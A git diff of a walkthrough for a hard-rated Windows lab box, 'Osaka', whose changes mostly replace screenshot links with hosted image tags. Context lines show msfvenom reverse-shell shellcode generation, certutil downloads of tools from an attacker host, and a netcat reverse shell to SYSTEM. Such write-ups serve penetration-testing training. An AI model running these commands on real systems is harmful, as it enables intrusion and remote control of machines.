@@ -52,7 +52,10 @@ Osaka is a hard-rated Windows box centered on binary exploitation of a custom FT
 nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.164.20
 ```
 
-![Nmap Scan Results](screenshots/01_nmap_scan.png)
+<img width="1058" height="760" alt="image" src="https://github.com/user-attachments/assets/c18d8c04-29fc-4993-9401-1423b9eb39b0" />
+<img width="1675" height="613" alt="image" src="https://github.com/user-attachments/assets/4b34a48b-11eb-4e34-9479-1692ee5406dc" />
+<img width="1320" height="446" alt="image" src="https://github.com/user-attachments/assets/c4732ad2-dc8f-46ec-881f-13afa68bbf84" />
+
 
 ### Results
 
@@ -85,7 +88,8 @@ ftp 192.168.164.20
 # Password: (blank)
 ```
 
-![Anonymous FTP Login](screenshots/02_ftp_anonymous_login.png)
+<img width="951" height="662" alt="image" src="https://github.com/user-attachments/assets/c357dedb-43ab-45c4-a7ad-97e6bb552e2e" />
+
 
 Anonymous authentication succeeded. The FTP server was locked to the `C:\dev` directory, which contained two files:
 
@@ -101,7 +105,8 @@ ftp> get dev.txt
 ftp> get ftp.exe
 ```
 
-![FTP File Download](screenshots/03_ftp_file_download.png)
+<img width="876" height="427" alt="image" src="https://github.com/user-attachments/assets/054b7854-de5e-4d9b-b640-f72415b64af2" />
+
 
 **`dev.txt` contents:**
 ```
@@ -120,7 +125,8 @@ This is a development server.
 strings ftp.exe
 ```
 
-![Strings Output](screenshots/04_strings_ftp_exe.png)
+<img width="689" height="255" alt="image" src="https://github.com/user-attachments/assets/aacdfb56-98bb-49ff-92ed-87f1d5235c43" />
+
 
 **Sections identified:**
 ```
@@ -158,7 +164,8 @@ leak = leak.split(b"|")
 leak_pie = int(leak[0], 16)
 ```
 
-![Format String Leak](screenshots/05_format_string_leak.png)
+<img width="689" height="255" alt="image" src="https://github.com/user-attachments/assets/00a8317f-c661-4ebf-9d15-a868980b9ee0" />
+
 
 - The **first leaked value** is an address inside the binary itself
 - Subtracting the known static offset `0x10f0` gives the **runtime binary base address**
@@ -229,7 +236,8 @@ msfvenom -a x86 --platform windows \
   -f python -v sc
 ```
 
-![msfvenom Shellcode Generation](screenshots/06_msfvenom_shellcode.png)
+<img width="1449" height="501" alt="image" src="https://github.com/user-attachments/assets/37917abb-7847-4c72-93a5-68bf5d33233b" />
+
 
 **Payload size:** 324 bytes — `windows/shell_reverse_tcp`
 
@@ -333,13 +341,15 @@ nc -lvnp 1337
 python3 exploit.py
 ```
 
-![Exploit Execution](screenshots/07_exploit_execution.png)
+<img width="883" height="238" alt="image" src="https://github.com/user-attachments/assets/9a61a55f-9e02-4b0c-ba24-660409d69ade" />
+
 
 ---
 
 ## 🚪 Initial Access
 
-![Initial Shell](screenshots/08_initial_shell.png)
+<img width="971" height="556" alt="image" src="https://github.com/user-attachments/assets/f343a539-3a71-4cf3-bd70-1c4405b84474" />
+
 
 ```
 connect to [192.168.45.157] from (UNKNOWN) [192.168.164.20] 50200
@@ -353,7 +363,8 @@ Shell received as **Wilson** on `OSAKA`. Navigated to `C:\Users\Wilson\Desktop`:
 C:\Users\Wilson\Desktop> type local.txt
 ```
 
-![Local Flag](screenshots/09_local_txt.png)
+<img width="971" height="556" alt="image" src="https://github.com/user-attachments/assets/ae922e6f-2603-4e85-baa0-008c178b313a" />
+
 
 ```
 448353a193a519cd417e851b7e10adee
@@ -369,7 +380,8 @@ C:\Users\Wilson\Desktop> type local.txt
 whoami /priv
 ```
 
-![whoami /priv Output](screenshots/10_whoami_priv.png)
+<img width="1200" height="429" alt="image" src="https://github.com/user-attachments/assets/9e798389-0fe6-4318-8c1c-91ff34f0db3c" />
+
 
 ```
 PRIVILEGES INFORMATION
@@ -402,7 +414,9 @@ certutil -urlcache -split -f http://192.168.45.157:8000/SeDebugPrivilegePoC.exe 
 certutil -urlcache -split -f http://192.168.45.157:8000/nc.exe nc.exe
 ```
 
-![Certutil Downloads](screenshots/11_certutil_download.png)
+<img width="1514" height="794" alt="image" src="https://github.com/user-attachments/assets/c702caef-f788-47ee-b8f8-e5e516035b87" />
+<img width="899" height="191" alt="image" src="https://github.com/user-attachments/assets/f961ce89-6f4e-4891-9001-3ea9d865b4a4" />
+
 
 ```
 C:\Users\Wilson\Documents> dir
@@ -422,7 +436,8 @@ nc -lvnp 4444
 SeDebugPrivilegePoC.exe "C:\Users\Wilson\Documents\nc.exe 192.168.45.157 4444 -e C:\Windows\system32\cmd.exe"
 ```
 
-![SeDebugPrivilegePoC Execution](screenshots/12_sedebug_poc_execution.png)
+<img width="1668" height="379" alt="image" src="https://github.com/user-attachments/assets/6d9e7ad2-6594-4062-9497-db7f42c136c3" />
+
 
 ```
 [*] Modified by r4j3sh
@@ -436,7 +451,8 @@ SeDebugPrivilegePoC.exe "C:\Users\Wilson\Documents\nc.exe 192.168.45.157 4444 -e
 
 ### SYSTEM Shell Received
 
-![SYSTEM Shell](screenshots/13_system_shell.png)
+<img width="711" height="156" alt="image" src="https://github.com/user-attachments/assets/0c248c1b-c006-4276-9d45-60f758fd283f" />
+
 
 ```
 connect to [192.168.45.157] from (UNKNOWN) [192.168.164.20] 50146
@@ -454,7 +470,8 @@ The new shell runs as a **child of `winlogon.exe`** — effectively SYSTEM-level
 C:\Users\Administrator\Desktop> type proof.txt
 ```
 
-![Proof Flag](screenshots/14_proof_txt.png)
+<img width="821" height="807" alt="image" src="https://github.com/user-attachments/assets/d5a54bd5-d7ab-4e19-b168-6bdbaf62422d" />
+
 
 | Flag | Location | Value |
 |------|----------|-------|
